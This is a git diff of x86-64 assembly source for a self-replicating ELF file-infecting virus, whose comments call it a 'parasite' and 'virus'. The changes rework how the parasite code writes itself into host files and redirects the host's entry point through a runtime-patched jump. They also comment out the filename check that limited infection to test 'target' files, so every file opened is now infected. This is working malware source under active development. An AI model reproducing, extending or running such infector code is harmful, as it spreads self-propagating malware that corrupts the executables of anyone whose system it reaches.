@@ -222,7 +222,8 @@ delta_offset: ; BECAUSE PARASITE END WILL BE DIFFERENT IN EACH HOST FILE
 	pop r15
 	sub r15, delta_offset ; STORE OUR DELTA OFFSET IN R15
 
-	mov dword[r15+_parasiteEnd-4], eax
+	; mov dword[r15+_parasiteEnd-4], eax
+	mov r15, rax ; SAVING OUR NEW HOST ENTRY ADDR IN R15
 	; REDIRECTING OUR VIRUS BY MODIFYING THE CODE AT RUNTIME, INSANE !
 
 	; # INCREASE DATA SEG SIZE
@@ -411,6 +412,8 @@ _postLoop:
 	mov rax, 1 ; WRITE KERNEL CODE
 	mov rdi, r9 ; FD
 
+	push r15 ; SAVE OUR ENTRY POINT JUMP ADDRESS
+
 	call delta_offset2 ; DELTA OFFSET TRICK
 delta_offset2: ; BECAUSE PARASITE START WILL BE DIFFERENT IN EACH HOST FILE
 	pop r15
@@ -418,8 +421,20 @@ delta_offset2: ; BECAUSE PARASITE START WILL BE DIFFERENT IN EACH HOST FILE
 
 	mov rsi, _parasiteStart ; ADDR OF THE BEGINNING OF OUR PARASITE
 	add rsi, r15 ; ADDING DELTA OFFSET
-	mov rdx, _parasiteEnd - _parasiteStart ; SIZE OF OUR PARASITE CODE
+
+	pop r15; RESTORE ENTRY POINT JUMP ADDR
+
+	mov rdx, _parasiteEnd - _parasiteStart - 4 ; SIZE OF OUR PARASITE CODE - FINAL JUMP ADDR
 	syscall ; WRITE SYSCALL
+
+	; # WRITE HOST ENTRY POINT TO REDIRECT OUR VIRUS
+	mov rax, 1
+	mov rdi, r9
+	push r15
+	lea rsi, [rsp]
+	mov rdx, 0x4
+	syscall
+	add rsp, 8
 
 	; REWRITE THE EOF
 	mov rax, 1 ; WRITE KERNEL CODE
@@ -486,9 +501,9 @@ open_file:
 	mov rdi, rdx ; PATHNAME
 	mov r10, rdx ; FOR LATER ON INJECT
 	mov rsi, 2 ; O_RDWR
-	cmp word[rdi], 0x67726174 ; TESTING PURPOSES, WONT INFECT ALL FILES FOR NOW
+	; cmp word[rdi], 0x67726174 ; TESTING PURPOSES, WONT INFECT ALL FILES FOR NOW
 							  ; CHECKING FOR BEGINNING "targ" IN FILENAME
-	jne _openEnd ; IF NOT "target" FILE, SKIP
+	; jne _openEnd ; IF NOT "target" FILE, SKIP
 	syscall
 	; # ANALYSE FILE
 	cmp rax, 0 ; CHECK IF FD > 0
@@ -630,7 +645,6 @@ _code:
 	pop rbx
 	pop rax
 
-	; # JUMP
-	jmp -0x1050 ; RELATIVE JUMP WILL BE MODIFIED AT RUNTIME, INSANE !
+	jmp 0x0000; RELATIVE JUMP WILL BE MODIFIED AT RUNTIME, INSANE !
 
 _parasiteEnd:
